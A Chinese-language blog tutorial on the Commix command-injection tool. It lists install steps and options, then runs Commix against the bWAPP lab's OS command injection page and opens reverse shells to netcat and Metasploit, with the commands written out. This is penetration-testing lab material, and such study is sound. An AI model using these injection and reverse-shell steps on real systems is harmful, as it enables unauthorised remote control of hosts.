---
layout:     post
title:      Commix工具的使用
subtitle:   命令执行漏洞的检测工具
date:       2019-07-22
author:     看不尽的尘埃
header-img: img/post-bg-ios9-web.jpg
catalog: 	 true
tags:
    - Commix
---
# 安装
安装Commix很简单，Linux下只需要输入以下命令即可：
```
git clone https://github.com/commixproject/commix.git commix
```
Windows系统只要在Github上下载源码下来，用python运行就行：
```
https://github.com/commixproject/commix
```
## 运行环境
Python 2.6.x or 2.7.x
## 运行
python commix.py [options]

# 常用命令
```
-h, --help            显示帮助信息
--verbose             开启详细模式
--install             将“commix”安装到您的系统
--version             显示当前版本
--update              检查更新
--url=URL           目标URL
--url-reload        命令执行后重新加载目标URL
--host=HOST         HTTP Host header.
--referer=REFERER   HTTP Referer header.
--user-agent=AGENT  HTTP User-Agent header.
--cookie=COOKIE     HTTP Cookie header.
--headers=HEADERS   Extra headers (e.g. 'Header1:Value1\nHeader2:Value2').
--proxy=PROXY       使用代理 (e.g. '127.0.0.1:8080').
--data=DATA         POST data to inject (use 'INJECT_HERE' tag).
--suffix=SUFFIX     Injection payload suffix string.
--prefix=PREFIX     Injection payload prefix string.
--technique=TECH    Specify a certain injection technique : 'classic',
                    'eval-based', 'time-based' or 'file-based'.
--maxlen=MAXLEN     The length of the output on time-based technique
                    (Default: 10000 chars).
--delay=DELAY       Set Time-delay for time-based and file-based
                    techniques (Default: 1 sec).
--base64            Use Base64 (enc)/(de)code trick to prevent false-
                    positive results.
```
# 检测命令执行漏洞
以bWAPP为靶机进行测试，进入OS Command injection靶场页面

![图片](../../../../img/commix_1.png)

输入一个域名后，使用抓包工具抓取HTTP请求数据包
![图片](../../../../img/commix_2.png)

然后进入Kali Linux 输入以下命令：
```
commix -u "http://10.20.40.147/bWAPP/commandi.php" --data "target=www.baidu.com&form=submit" --cookie "PHPSESSID=a26193b0ef93766968e0b2daae34971f; security_level=0"
```
![图片](../../../../img/commix_3.png)

从上图可以看到，命令执行漏洞被Commix发现，并且我们可以在命令终端上输入任意系统命令
# 反弹shell
下面我们来通过Commix反弹到NC和MSF上。
## 反弹至NC
在Commix检测到存在命令执行漏洞后，会返回一个交互行，输入以下内容后进入选项，要反弹到NC上，在Reverse TCP shells 时选1，Unix-like targets 时 选 1:
```
reverse_tcp
set LHOST your_ip
set LPORT your_port
```
![图片](../../../../img/commix_4.png)
在回车之前，先打开NC 监听端口，下图可以看到成功反弹到了NC上：
![图片](../../../../img/commix_5.png)

## 反弹至MSF
在Commix检测到存在命令执行漏洞后，会返回一个交互行，输入以下内容后进入选项，要反弹到MSF上，在Reverse TCP shells 时选2，Metarpreter reverse TCP shells 时选 8，如果靶场环境搭建在Windows上，可以选择10 。

![图片](../../../../img/commix_6.png)
回车后，会自动生成rc文件，这时我们只要打开一个新的命令终端，输入以下命令：
```
msfconsole -r /usr/share/commix/php_meterpreter.rc
```
下图可以看到，成功反弹到了MSF上
![图片](../../../../img/commix_7.png)


